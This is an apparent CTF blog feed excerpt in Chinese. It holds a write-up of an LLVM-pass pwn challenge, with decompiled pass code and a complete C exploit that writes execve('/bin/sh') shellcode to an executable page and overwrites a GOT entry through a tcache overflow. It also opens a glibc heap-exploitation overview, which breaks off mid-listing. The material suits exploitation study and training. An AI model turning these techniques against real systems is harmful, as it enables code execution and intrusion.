llvm::Function *v70; <span class="comment">// [rsp+178h] [rbp-18h]</span></span><br><span class="line">  __int64 v71; <span class="comment">// [rsp+180h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> v72; <span class="comment">// [rsp+18Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  v71 = a1;</span><br><span class="line">  v70 = a2;</span><br><span class="line">  v69[<span class="number">1</span>] = llvm::Value::getName(a2);</span><br><span class="line">  v69[<span class="number">2</span>] = v2;</span><br><span class="line">  v68 = llvm::Function::end(a2);</span><br><span class="line">  llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;::ilist_iterator&lt;<span class="literal">false</span>&gt;(</span><br><span class="line">    v69,</span><br><span class="line">    &amp;v68,</span><br><span class="line">    <span class="number">0LL</span>);</span><br><span class="line">  v66 = llvm::Function::begin(v70);</span><br><span class="line">  llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;::ilist_iterator&lt;<span class="literal">false</span>&gt;(</span><br><span class="line">    &amp;v67,</span><br><span class="line">    &amp;v66,</span><br><span class="line">    <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( (llvm::operator!=(&amp;v67, v69) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;::operator-&gt;(&amp;v67);</span><br><span class="line">    v65 = llvm::BasicBlock::begin(v3);</span><br><span class="line">    v4 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;::operator-&gt;(&amp;v67);</span><br><span class="line">    v64 = llvm::BasicBlock::end(v4);</span><br><span class="line">    <span class="keyword">while</span> ( (llvm::operator!=(&amp;v65, &amp;v64) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = (llvm::Instruction *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;::operator-&gt;(&amp;v65);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::Instruction::getOpcode(v5) == <span class="number">56</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v63 = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;&gt;(&amp;v65);</span><br><span class="line">        CalledFunction = (llvm::Value *)llvm::CallBase::getCalledFunction(v63);</span><br><span class="line">        Name = llvm::Value::getName(CalledFunction);</span><br><span class="line">        v62 = v7;</span><br><span class="line">        v59 = Name;</span><br><span class="line">        v60 = v7;</span><br><span class="line">        llvm::StringRef::StringRef((<span class="built_in">std</span>::_Function_base *)v58, <span class="string">&quot;Add&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (llvm::operator==(v59, v60, v58[<span class="number">0</span>], v58[<span class="number">1</span>]) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          Operand = llvm::CallBase::getOperand(v63, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( (llvm::isa&lt;llvm::ConstantInt,llvm::Value *&gt;(&amp;Operand) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v10 = llvm::errs((llvm *)&amp;Operand);</span><br><span class="line">            v11 = llvm::raw_ostream::operator&lt;&lt;(v10, <span class="string">&quot;Error argument&quot;</span>);</span><br><span class="line">            llvm::raw_ostream::operator&lt;&lt;(v11, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            v72 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> v72 &amp; <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          ArgOperand = llvm::CallBase::getArgOperand(v63, <span class="number">0</span>);</span><br><span class="line">          v9 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOperand);</span><br><span class="line">          ZExtValue = llvm::ConstantInt::getZExtValue(v9);</span><br><span class="line">          v55 = <span class="number">0LL</span>;</span><br><span class="line">          v55 = <span class="built_in">malloc</span>(ZExtValue);</span><br><span class="line">          <span class="keyword">if</span> ( !v55 )</span><br><span class="line">          &#123;</span><br><span class="line">            perror(<span class="string">&quot;malloc&quot;</span>);</span><br><span class="line">            v72 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> v72 &amp; <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !*((_QWORD *)&amp;addrList + i) )</span><br><span class="line">            &#123;</span><br><span class="line">              *((_QWORD *)&amp;addrList + i) = v55;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v52 = Name;</span><br><span class="line">          v53 = v62;</span><br><span class="line">          llvm::StringRef::StringRef((<span class="built_in">std</span>::_Function_base *)v51, <span class="string">&quot;Del&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> ( (llvm::operator==(v52, v53, v51[<span class="number">0</span>], v51[<span class="number">1</span>]) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v12 = (llvm::User *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;::operator-&gt;(&amp;v65);</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::User::getNumOperands(v12) != <span class="number">2</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;ERROR argument size&quot;</span>);</span><br><span class="line">              v72 = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">return</span> v72 &amp; <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            v50 = llvm::CallBase::getOperand(v63, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> ( (llvm::isa&lt;llvm::ConstantInt,llvm::Value *&gt;(&amp;v50) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v13 = llvm::CallBase::getArgOperand(v63, <span class="number">0</span>);</span><br><span class="line">              v14 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v13);</span><br><span class="line">              v49 = llvm::ConstantInt::getZExtValue(v14);</span><br><span class="line">              <span class="keyword">if</span> ( !*((_QWORD *)&amp;addrList + v49) || v49 &gt;= <span class="number">32</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v72 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">return</span> v72 &amp; <span class="number">1</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;addrList + v49));</span><br><span class="line">              *((_QWORD *)&amp;addrList + v49) = <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v47 = Name;</span><br><span class="line">            v48 = v62;</span><br><span class="line">            llvm::StringRef::StringRef((<span class="built_in">std</span>::_Function_base *)v46, <span class="string">&quot;Edit&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( (llvm::operator==(v47, v48, v46[<span class="number">0</span>], v46[<span class="number">1</span>]) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v15 = (llvm::User *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;::operator-&gt;(&amp;v65);</span><br><span class="line">              <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::User::getNumOperands(v15) != <span class="number">4</span> )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">              v45 = llvm::CallBase::getOperand(v63, <span class="number">0</span>);</span><br><span class="line">              v29 = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">if</span> ( (llvm::isa&lt;llvm::ConstantInt,llvm::Value *&gt;(&amp;v45) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v44 = llvm::CallBase::getOperand(v63, <span class="number">1u</span>);</span><br><span class="line">                v29 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> ( (llvm::isa&lt;llvm::ConstantInt,llvm::Value *&gt;(&amp;v44) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  v43 = llvm::CallBase::getOperand(v63, <span class="number">2u</span>);</span><br><span class="line">                  v29 = llvm::isa&lt;llvm::ConstantInt,llvm::Value *&gt;(&amp;v43);</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( (v29 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v16 = llvm::CallBase::getArgOperand(v63, <span class="number">0</span>);</span><br><span class="line">                v17 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v16);</span><br><span class="line">                v42 = llvm::ConstantInt::getZExtValue(v17);</span><br><span class="line">                v18 = llvm::CallBase::getArgOperand(v63, <span class="number">1u</span>);</span><br><span class="line">                v19 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v18);</span><br><span class="line">                v41 = llvm::ConstantInt::getZExtValue(v19);</span><br><span class="line">                v20 = llvm::CallBase::getArgOperand(v63, <span class="number">2u</span>);</span><br><span class="line">                v21 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v20);</span><br><span class="line">                v40 = llvm::ConstantInt::getZExtValue(v21);</span><br><span class="line">                <span class="keyword">if</span> ( !*((_QWORD *)&amp;addrList + v42) || v42 &gt;= <span class="number">32</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  v72 = <span class="number">0</span>;</span><br><span class="line">                  <span class="keyword">return</span> v72 &amp; <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                *(_DWORD *)(*((_QWORD *)&amp;addrList + v42) + <span class="number">4LL</span> * v41) = v40;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v38 = Name;</span><br><span class="line">              v39 = v62;</span><br><span class="line">              llvm::StringRef::StringRef((<span class="built_in">std</span>::_Function_base *)v37, <span class="string">&quot;Alloc&quot;</span>);</span><br><span class="line">              <span class="keyword">if</span> ( (llvm::operator==(v38, v39, v37[<span class="number">0</span>], v37[<span class="number">1</span>]) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                mmap(&amp;off_10000, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                v35 = Name;</span><br><span class="line">                v36 = v62;</span><br><span class="line">                llvm::StringRef::StringRef((<span class="built_in">std</span>::_Function_base *)v34, <span class="string">&quot;EditAlloc&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> ( (llvm::operator==(v35, v36, v34[<span class="number">0</span>], v34[<span class="number">1</span>]) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  v22 = (llvm::User *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;::operator-&gt;(&amp;v65);</span><br><span class="line">                  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::User::getNumOperands(v22) != <span class="number">3</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">LABEL_28:</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Error argument size&quot;</span>);</span><br><span class="line">                    v72 = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">return</span> v72 &amp; <span class="number">1</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                  v33 = llvm::CallBase::getOperand(v63, <span class="number">0</span>);</span><br><span class="line">                  v28 = <span class="number">0</span>;</span><br><span class="line">                  <span class="keyword">if</span> ( (llvm::isa&lt;llvm::ConstantInt,llvm::Value *&gt;(&amp;v33) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    v32 = llvm::CallBase::getOperand(v63, <span class="number">1u</span>);</span><br><span class="line">                    v28 = llvm::isa&lt;llvm::ConstantInt,llvm::Value *&gt;(&amp;v32);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">if</span> ( (v28 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    v23 = llvm::CallBase::getArgOperand(v63, <span class="number">0</span>);</span><br><span class="line">                    v24 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v23);</span><br><span class="line">                    v31 = llvm::ConstantInt::getZExtValue(v24);</span><br><span class="line">                    v25 = llvm::CallBase::getArgOperand(v63, <span class="number">1u</span>);</span><br><span class="line">                    v26 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v25);</span><br><span class="line">                    v30 = llvm::ConstantInt::getZExtValue(v26);</span><br><span class="line">                    <span class="keyword">if</span> ( !*((_QWORD *)&amp;addrList + v31) || v31 &gt;= <span class="number">32</span> || v30 &gt;= <span class="number">256</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                      v72 = <span class="number">0</span>;</span><br><span class="line">                      <span class="keyword">return</span> v72 &amp; <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    *(_DWORD *)(v30 + <span class="number">0x10000</span>) = **((_DWORD **)&amp;addrList + v31);</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;::operator++(&amp;v65);</span><br><span class="line">    &#125;</span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;::operator++(&amp;v67);</span><br><span class="line">  &#125;</span><br><span class="line">  v72 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v72 &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>实现了一个类似菜单堆的面板，通过Alloc可以分配一块位于0x10000的可执行区域，在此写入shellcode，Edit存在溢出，可以使用负偏移从而改写tcache管理结构体，这里考虑将0x40的链表改写成oprator delete(void*) 的got表的位置，并且将其剩余数量改写为1，以防止继续分配coredump，之后覆写got表为0x10000。</p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Add</span><span class="params">(<span class="type">int</span> size)</span>;</span><br><span class="line"><span class="comment">// Add any size</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Del</span><span class="params">(<span class="type">int</span> idx)</span>;</span><br><span class="line"><span class="comment">// Del</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Edit</span><span class="params">(<span class="type">int</span> idx, <span class="type">int</span> offset, <span class="type">unsigned</span> <span class="type">int</span> num)</span>;</span><br><span class="line"><span class="comment">// Alloc</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Alloc</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">EditAlloc</span><span class="params">(<span class="type">int</span> num, <span class="type">int</span> offset)</span>;</span><br><span class="line"><span class="comment">// write got</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&quot;\x48\x31\xf6\x56</span></span><br><span class="line"><span class="comment">0x56f63148</span></span><br><span class="line"><span class="comment">\x48\xbf\x2f\x62</span></span><br><span class="line"><span class="comment">0x622fbf48</span></span><br><span class="line"><span class="comment">\x69\x6e\x2f\x2f</span></span><br><span class="line"><span class="comment">0x2f2f6e69</span></span><br><span class="line"><span class="comment">\x73\x68\x57\x54&quot;</span></span><br><span class="line"><span class="comment">0x54576873</span></span><br><span class="line"><span class="comment">&quot;\x5f\xb0\x3b\x99</span></span><br><span class="line"><span class="comment">0x993bb05f</span></span><br><span class="line"><span class="comment">\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    Add(<span class="number">0</span>); <span class="comment">// 0</span></span><br><span class="line">    Edit(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0x56f63148</span>);</span><br><span class="line">    Add(<span class="number">0</span>); <span class="comment">// 1</span></span><br><span class="line">    Edit(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0x622fbf48</span>);</span><br><span class="line">    Add(<span class="number">0</span>); <span class="comment">// 2</span></span><br><span class="line">    Edit(<span class="number">2</span>, <span class="number">0</span>, <span class="number">0x2f2f6e69</span>);</span><br><span class="line">    Add(<span class="number">0</span>); <span class="comment">// 3</span></span><br><span class="line">    Edit(<span class="number">3</span>, <span class="number">0</span>, <span class="number">0x54576873</span>);</span><br><span class="line">    Add(<span class="number">0</span>); <span class="comment">// 4</span></span><br><span class="line">    Edit(<span class="number">4</span>, <span class="number">0</span>, <span class="number">0x993bb05f</span>);</span><br><span class="line">    Add(<span class="number">0</span>); <span class="comment">// 5</span></span><br><span class="line">    Edit(<span class="number">5</span>, <span class="number">0</span>, <span class="number">0x050f</span>);</span><br><span class="line">    Alloc();</span><br><span class="line">    EditAlloc(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    EditAlloc(<span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">    EditAlloc(<span class="number">2</span>, <span class="number">4</span> * <span class="number">2</span>);</span><br><span class="line">    EditAlloc(<span class="number">3</span>, <span class="number">4</span> * <span class="number">3</span>);</span><br><span class="line">    EditAlloc(<span class="number">4</span>, <span class="number">4</span> * <span class="number">4</span>);</span><br><span class="line">    EditAlloc(<span class="number">5</span>, <span class="number">4</span> * <span class="number">5</span>);</span><br><span class="line">    <span class="comment">// set tcache 0x40 num and link</span></span><br><span class="line">    Edit(<span class="number">0</span>, <span class="number">-0x25d6f</span>, <span class="number">1</span>);</span><br><span class="line">    Edit(<span class="number">0</span>, <span class="number">-0x25d4c</span>, (<span class="number">0x78B000</span>));</span><br><span class="line">    <span class="comment">// make opretor delete got to 0x10000</span></span><br><span class="line">    Add(<span class="number">0x30</span>); <span class="comment">// 6</span></span><br><span class="line">    Edit(<span class="number">6</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    Edit(<span class="number">6</span>, <span class="number">0</span>, <span class="number">0x10000</span>);</span><br><span class="line">    <span class="comment">// Add(0);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;overview&quot;&gt;overview&lt;/h1&gt;
&lt;p&gt;华中赛遇到了一个llvm的题，顺手系统总结一下llvm pass吧。&lt;/p&gt;
&lt;p&gt;首先简单介绍一下llvm，llvm是一套用C++编写的编译器基础设施。LLVM Pass提供了一些可供重写的函数，本义是用来实现一些优化。而Pwn的llvm pass类题，就是重写了runOnFunction函数。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://v3rdant.cn/categories/CTF/"/>
    
    
    <category term="Pwn" scheme="https://v3rdant.cn/tags/Pwn/"/>
    
    <category term="CTF" scheme="https://v3rdant.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Pwn.Heap-Exploation-up-to-2.31</title>
    <link href="https://v3rdant.cn/Pwn.Heap-Exploation-up-to-2.31/"/>
    <id>https://v3rdant.cn/Pwn.Heap-Exploation-up-to-2.31/</id>
    <published>2023-06-20T16:00:00.000Z</published>
    <updated>2024-01-12T13:06:54.960Z</updated>
    
    <content type="html"><![CDATA[<p>关于heap我所知道的一切</p><span id="more"></span><h1 id="Basic-Knowledge">Basic Knowledge</h1><h6 id="bins">bins:</h6><table><thead><tr><th>unsorted bin</th><th>fast bin</th><th>small bin</th><th>large bin</th></tr></thead><tbody><tr><td>NO LIMITATION</td><td>0x20-0x80</td><td>&lt;0x400</td><td>&gt;0x400</td></tr></tbody></table><h2 id="libc-version">libc version</h2><p>ubuntu-libc version</p><ul><li>2.23=“16.04”</li><li>2.24=“17.04”</li><li>2.26=“17.10”</li><li>2.27=“18.04”</li><li>2.28=“18.10”</li><li>2.29=“19.04”</li><li>2.30=“19.10”</li><li>2.31=“20.04”</li><li>2.32=“20.10”</li><li>2.33=“21.04”</li><li>2.34=“22.04”</li></ul><h1 id="Overview">Overview</h1><p>在刚刚入门堆时，笔者是比较苦恼的，笔者在学习一项知识时，习惯性地想先从大局着手来学习。即，先对这个知识内容的整体有一定了解后，再去填充细节内容。然而在笔者开始学习堆利用时，被各种繁杂的版本差异和堆利用弄得头昏脑涨，因此对于堆一直不得其门而入，无法深刻理解多种多样的技巧及其使用时机，也因此不像栈溢出一样，笔者无法快速理出一个直观的脉络，然后安排细化的学习路径。</p><p>本文主要<strong>针对glibc2.30及以上</strong>有着tcache的版本。<s>因为低于2.27版本的堆笔者根本不会</s></p><p>正如关于栈溢出的文章中，笔者根据攻击点将栈溢出分为三种，在这篇文章中，笔者也将拆解heap exploation，完成笔者心目中的一个划分。</p><p>在笔者看来，一次堆利用主要分为一下几个步骤：</p><ul><li>漏洞的发现</li><li>地址的泄露</li><li>利用漏洞控制目标地址内容</li><li>攻击的对象</li></ul><p>因此，本文的主要的编排顺序，也是按照这样几个顺序来实现的。笔者首先将会介绍堆利用过程中的一些基本漏洞，其次，笔者将会介绍如何完成地址泄露，接着，笔者将会讨论一些heap exploation的技术以及这些技术如何控制目标地址，而在可以控制一个目标地址后，最后笔者将讨论如何如何我们可以选取哪些攻击对象，以及他们各自有什么优劣。</p><p>笔者写这一篇文章时，去年这个时间差不多是我刚刚开始学习堆利用的时间，经过一年的时间，笔者总算感觉对于堆利用有了一个比较综合性的认知，尽管当前关于heap exploation的blog很多，但是笔者仍然感觉过于零散，因此，在这篇文章中，同笔者关于栈溢出的文章一样，笔者也不会过多的讲述各个技巧的细节–去看这些技巧的提出者大师傅可能讲述地要比我更完善–而着重于贯穿各个技巧的联系， <s>才不是因为笔者懒呢</s> ，目的是提供一个学习路径的图谱和完成一次堆利用时的思考路径。</p><h1 id="基本漏洞">基本漏洞</h1><p><strong>UAF</strong><br>在free时没有清空指针，可以重利用指针。<br>在没有<code>Edit</code> 的情况下，可以通过 <code>double free</code> 进行堆块重叠。</p><p><strong>overflow</strong><br>溢出，可以控制下一个chunk，一般而言，可以方便地转换为堆块重叠，因此，也容易利用</p><p><strong>off-by-one</strong>/<strong>off-by-null</strong><br>这里主要针对2.29-2.31版本, <a href="https://www.anquanke.com/post/id/236078#h3-4">2.29-2.31版本的off-by-null</a> ，wjh师傅已经讲解的非常详细了，核心就是通过unsorted bin机制残留的指针伪造fd、bk，来进行unlink，最后制造堆重叠。</p><p><strong>漏洞的利用</strong><br>上述几个漏洞都可以方便地转换为堆重叠，在此基础上，可以很方便地转换为任意地址写，在small bin的范围内，可以考虑tcache poison，在large bin的范围内，可以考虑large bin attack，在此基础上再对特定的攻击面进行攻击，即可劫持控制流<br>考虑:</p><ul><li>one gadget</li><li>system(“/bin/sh”)</li><li>orw</li></ul><h1 id="leak">leak</h1><p>一般而言，堆题中的leak主要是针对libc地址，heap地址的leak相对而言较为简单，而libc地址的leak将在 [[#stack]] 攻击面部分详述。</p><p>一般而言，heap leak 堆地址主要利用unsorted bin的第一个chunk会存在libc地址来leak。如果存在UAF，可以将一个直接放入unsorted bin，然后show来获得。</p><p>也可以释放入unsorted  bin 后再申请回来实现，由于malloc并不会清空chunk内容，因此可以读取到残留的libc的指针。</p><p>而在没有show相关输出chunk内容的函数时，考虑通过<code>_IO_2_1_stdout_</code> 来leak<br>基本原理就是partial overwrite 覆盖unsorted  bin中的libc地址，分配到__IO_2_1_stdout的位置，然后改写来完成leak</p><h1 id="Basic-tricks-up-to-2-30">Basic tricks up to 2.30</h1><p>在2.30以上的版本，我认为需要掌握的基本技术主要包括:</p><ul><li>[x] largebin attack</li><li>[x] tcache stashing unlink attack</li><li>[x] unsafe unlink</li><li>[x] tcache poison</li><li>[x] house of botcake</li><li>[x] decrypt safe_unlink</li><li>[x] house of pig</li><li>[x] 堆布局</li></ul><p>这里结合how to heap源代码分析</p><h2 id="Largebin-attack">Largebin attack</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span 